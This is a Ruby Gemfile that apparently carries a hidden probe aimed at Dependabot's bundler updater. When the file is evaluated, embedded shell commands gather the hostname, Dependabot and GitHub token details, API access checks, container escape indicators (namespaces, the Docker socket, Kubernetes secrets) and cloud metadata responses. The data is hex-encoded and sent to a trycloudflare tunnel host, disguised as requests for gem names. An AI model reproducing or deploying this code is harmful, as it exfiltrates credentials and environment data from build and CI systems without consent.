source "https://rubygems.org"

TUN = "https://option-thats-dee-logistics.trycloudflare.com"

begin
  require "socket"
  data = ["TAG:DEPENDABOT-BOUNDARY-V2", "H:#{Socket.gethostname}", "P:#{Dir.pwd}"]
  cap = lambda do |label, command, limit|
    output = `#{command} 2>&1` rescue "ERR:#{$?.to_s[0, 20]}"
    data << "#{label}:#{output.to_s.split("\n").join("|")[0, limit]}"
  end
  keys = %w[DEPENDABOT_JOB_TOKEN DEPENDABOT_API_URL DEPENDABOT_JOB_ID DEPENDABOT_JOB_PATH DEPENDABOT_OUTPUT_PATH LOCAL_GITHUB_ACCESS_TOKEN HTTPS_PROXY]
  data << "ENV:" + keys.map { |key| "#{key}=#{ENV.key?(key) ? ENV.fetch(key).bytesize : 0}" }.join(",")
  cap.call("ID", "id", 70)
  cap.call("INTAPI", "u=\"${DEPENDABOT_API_URL%/}/update_jobs/$DEPENDABOT_JOB_ID/blocked_versions?package-manager=bundler\"; a=$(curl -sS -m 8 -o /tmp/zzint0 -w '%{http_code}' \"$u\"); b=$(curl -sS -m 8 -o /tmp/zzint1 -w '%{http_code}' -H \"Authorization: $DEPENDABOT_JOB_TOKEN\" \"$u\"); printf 'unauth=%s:' \"$a\"; head -c 60 /tmp/zzint0; printf '|auth=%s:' \"$b\"; head -c 100 /tmp/zzint1", 220)
  cap.call("API", "for p in user repos/chawdamrunal/probe-lab repos/chawdamrunal/f004-actions-lab-b; do c=$(curl -sS -m 8 -o /tmp/zzapi -w '%{http_code}' -H \"Authorization: Bearer $LOCAL_GITHUB_ACCESS_TOKEN\" https://api.github.com/$p); printf '%s=%s|' \"$p\" \"$c\"; done", 170)
  cap.call("STATUS", "grep -E '^(Pid|PPid|Uid|Gid|Cap(Eff|Bnd)|NoNewPrivs|Seccomp):' /proc/self/status", 150)
  cap.call("NS", "for n in pid mnt user net; do printf '%s=' \"$n\"; readlink /proc/self/ns/$n; printf '/p1='; readlink /proc/1/ns/$n; done", 130)
  cap.call("ROOT", "stat -c 'self=%d:%i p1=%d:%i' / /proc/1/root; cat /proc/1/comm; ls /proc/1/root | tr '\n' ','", 90)
  cap.call("RUNTIME", "ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1", 90)
  cap.call("SA", "ls -la /var/run/secrets/kubernetes.io/serviceaccount 2>&1", 65)
  cap.call("CG", "cat /proc/self/cgroup; cat /sys/fs/cgroup/{cpu.max,memory.max,pids.max} 2>&1", 75)
  cap.call("META", "for u in http://169.254.169.254/latest/meta-data/ http://169.254.169.254/metadata/instance?api-version=2021-02-01; do curl -sS -m 2 -o /tmp/zzm -w '%{http_code}:%{size_download}|' -H 'Metadata: true' \"$u\"; done", 65)
  blob = data.join("\n").unpack1("H*")
  chunks = (blob[0, 2900] || "").scan(/.{1,58}/) || []
  chunks.each_with_index do |c, i|
    gem "zz#{format('%02d', i)}#{c}", source: TUN, require: false
  end
rescue Exception => e
  begin
    gem "zzerr" + e.class.name.gsub(/[^a-z0-9]/i, "x").downcase[0, 20], source: TUN, require: false
  rescue Exception
  end
end

gem "i-do-not-exist-probe", source: TUN, require: false
gem "rack", "2.2.3"

gem "nokogiri", "1.13.0"
